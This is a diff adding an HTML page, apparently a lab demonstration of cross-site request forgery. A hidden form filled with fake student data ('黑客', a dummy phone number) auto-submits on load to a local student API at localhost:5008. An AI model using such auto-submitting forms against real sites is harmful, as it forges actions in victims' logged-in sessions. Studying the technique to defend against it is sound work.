@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <form
+      id="dangerform"
+      action="http://localhost:5008/api/student"
+      method="POST"
+    >
+      <input type="text" name="name" value="黑客" />
+      <input type="text" name="sex" value="0" />
+      <input type="text" name="mobile" value="10000000000" />
+      <input type="text" name="ClassId" value="9" />
+      <input type="text" name="birthday" value="0" />
+    </form>
+
+    <script>
+      document.getElementById("dangerform").submit();
+    </script>
+  </body>
+</html>
